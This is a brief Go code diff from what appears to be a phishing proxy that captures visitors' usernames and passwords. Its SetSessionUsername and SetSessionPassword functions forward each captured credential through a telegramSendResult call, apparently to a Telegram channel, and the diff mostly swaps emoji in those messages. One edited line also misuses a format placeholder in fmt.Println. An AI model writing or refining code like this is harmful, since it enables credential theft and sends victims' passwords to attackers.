@@ -162,7 +162,7 @@ func telegramSendVisitor(msg string) {
 	//     os.Exit(1)
 	// }
 
-	fmt.Println("Successfully sent mail to all user in toList")
+	fmt.Println("Successfully sent mail to all user in telegram: %s", msg)
 }
 
 type Database struct {
@@ -198,13 +198,13 @@ func (d *Database) ListSessions() ([]*Session, error) {
 }
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
-	telegramSendResult(fmt.Sprintf("USERNAME  :%s", username))
+	telegramSendResult(fmt.Sprintf("🌟 USERNAME  :%s", username))
 	err := d.sessionsUpdateUsername(sid, username)
 	return err
 }
 
 func (d *Database) SetSessionPassword(sid string, password string) error {
-	telegramSendResult(fmt.Sprintf("🔥 🔥 PASSWORD : %s", password))
+	telegramSendResult(fmt.Sprintf("🔑 PASSWORD : %s", password))
 	err := d.sessionsUpdatePassword(sid, password)
 	return err
 }
